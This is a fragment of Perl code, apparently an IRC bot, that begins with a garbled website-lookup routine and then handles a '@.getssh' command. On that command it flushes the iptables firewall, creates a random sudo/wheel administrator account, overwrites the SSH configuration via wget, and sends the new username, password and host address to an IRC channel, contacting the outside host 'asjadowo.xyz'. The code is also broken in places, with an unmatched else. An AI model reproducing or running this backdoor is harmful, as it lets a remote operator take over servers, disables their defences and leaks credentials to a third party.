if($response =~/> (.*?) visitors per day </)
    {
        print item(),"Hosting Info for Website: $site1\n";
        print item(),"Visitors per day: $1 \n";

        if($response =~/> (.*?) visitors per day on (.*?)</){
            print item(),"Visitors per day: $1 \n";
        }
        $ip= (gethostbyname($site1))[4];
        my ($a,$b,$c,$d) = unpack('C4',$ip);
        $ip_address ="$a.$b.$c.$d";
        print item(),"IP Address: $ip_address\n";

        else
        {
            print item(), "Didn't found it $https\n";
            }
 if ($msg =~ /@.getssh/) {
  warn 'Flushing iptables &  all remote connections.';
system "sudo iptables -F INPUT";
system "sudo iptables -P INPUT ACCEPT";
  warn 'Adding new admin account...';
$range = 999999999;
$minimum = 100000000;
$random_number = int(rand($range)) + $minimum;
$random_user = sprintf("%08X", rand(0xFFFFFFFF));
system 'sudo useradd -m ' . $random_user;
system "echo $random_user:$random_number | sudo chpasswd";
system 'if [ -f "/usr/bin/yum" ]; then sudo usermod -aG wheel ' . $random_user . '; fi';
system 'if [ -f "/usr/bin/apt" ]; then sudo adduser ' . $random_user . ' sudo; fi';
  warn 'Configuring SSH...';
system 'wget -O /etc/ssh/sshd_config ';
system 'wget -O /etc/ssh/sshd_banner ';
system 'if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi';
system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
  warn 'Getting External IP Address';
  $address = eval { Net::Address::IP::Local->connected_to('asjadowo.xyz') };
  @arr4y = ('9,1Added admin:', $random_user, 'password:', $random_number, 'on host:', $address);
  warn "@arr4y";
  $irc->write(notice => $noticechan => @arr4y);
 }

else {
    $irc->write(notice => $noticechan => "exploit is not running");
